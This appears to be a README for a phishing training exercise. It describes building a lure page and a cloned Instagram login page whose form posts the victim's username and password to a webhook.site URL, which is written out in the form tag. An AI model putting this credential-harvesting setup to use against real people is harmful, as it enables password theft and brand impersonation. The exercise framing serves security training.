#Phishing Exercise

## Introduction

There are different types of phishing, however, many of them are based on the reproduction of a web document, to do this it is necessary to use different programming languages and tools.

### Challenge

- Bob has a dog (a bull terrier) named "Shimi". Bob really loves his dog. 
- Your mission will be to obtain Bob's password of some platform of your choice.


___________________________________________________________

## Table of content

 - [Creating the webpage with HTML and CSS]()

- [Recreating Instagram Log-in page]()

- [WebHook]()

- [Script with JavaScript]()


#### **_NOTE: The exercise has been done entirely with VScode and then tested on Brave browser._** 


#### Inspiration from [Zphisher Tool.](https://github.com/htr-tech/zphisher "https://github.com/htr-tech/zphisher") 


______________________________________________________________________


### Creating the webpage with HTML and CSS

An HTML webpage is built using a combination of HTML (Hypertext Markup Language) and CSS (Cascading Style Sheets) to define the structure and presentation of the content.


#### Steps to create the phishing webpage:

- Doctype declaration (`<!DOCTYPE html>`) to specify the HTML version.
- Opening and closing `<html>` tags to enclose the HTML document.
- `<head>` section containing metadata such as character encoding, viewport settings, title, and external CSS stylesheets.
- Opening and closing `<body>` tags to contain the visible content of the webpage.
- `<div>` elements with classes "container" and "text-area" for organizing content.
- Heading elements (`<h1>`, `<h2>`, `<h3>`) for displaying different levels of headings.
- `<img>` tag to display an image.
- `<ul>` (unordered list) with `<li>` (list item) elements to create a bulleted list.
- `<button>` element with a class "call-to-action" and an anchor (`<a>`) element inside for creating a clickable button.
- Anchors (`<a>`) with href attributes to create links to other pages.

Additionally, the file references resources such as an image file ("Shimi-terrier.jpg"), a favicon image ("pedigree-logo.png"), and a CSS file ("style.css") for styling the webpage.

Here to see the codes.  ------>   [LINK]() 

[IMAGE of the HTML CODE]

#### Putting some style with CSS

The HTML file itself without the "styling" from the CSS  it would look so chaotic, so I wrote down some lines in order to customize a bit the webpage.

Here you can find the CSS file if you are curious to see.     ----->    [LINK]()


#### And here is the final result of our phishing page
[IMAGE of the HTML page]


________________________________

### Recreating Instagram Log-in page

##### Once you set up the HTML (with its CSS)
In my case I have created an html that works as an initial phishing webpage, with it a **"call to action"** button to redirect to a landing page that is a copy of Instagram Log-in page.

I managed to have a copy of the HTML and CSS of Instagram Log-In page through [CODEPEN.IO](https://codepen.io/azamatmj/pen/LdrMXv)

Looks pretty much the same as the original Instagram Log-In page, but I had to add the Header tag in the HTML in order to implement: Logo on the tab browser, link it with its CSS and finally in its body a  Script with JS (for the [WebHook]()).

Here is the HTML            ------->    [LINK]() 

Here is the CSS                ------->    [LINK]() 


##### Try to find the difference with the original site
[PHOTO OF THE LOG-IN PAGE]()


______________________________________


### Let's make it work now!

##### Collecting data with WebHook
To gather the information that our victim Bob is typing in order to log-in into Instagram to get in contact with Pedigree Team, we will be using [WebHook](https://webhook.site/)

Webhook.site, **an HTTP-based callback function that allows lightweight, event-driven communication between 2 application programming interfaces (APIs).** Webhooks are used by a wide variety of web apps to receive small amounts of data from other apps, but webhooks can also be used to trigger automation workflows in GitOps environments.

Once we get into the site, we will be given a unique URL  which we will need to insert in the HTML file, precisely in the "form" tag (in line 25) in order to communicate with the site:

```
<form id="myForm" action="https://webhook.site/1094a4f8-3820-40c4-9a7e-78383e181346" method= "POST" class="form">
```

__________________________________________


### Almost done!

##### JavaScript is the last step
We will need to finish with a script so we can make the Log-In webpage work and act like the real one and to make it **not redirect to the WebHook site** once the form is filled.


Finally we will insert before the closing tag of the body of our HTML file:
```
<script src="script.js"></script>
```
in order to implement it in the webpage.



Here is the JavaScript            ------->    [LINK]() 

_______________________________________


### Done!

Finally we can test it. Once filled the form and clicked on "log in", we can visit our WebHook site and we will find the credentials needed!

[PHOTO OF WEBHOOK]()
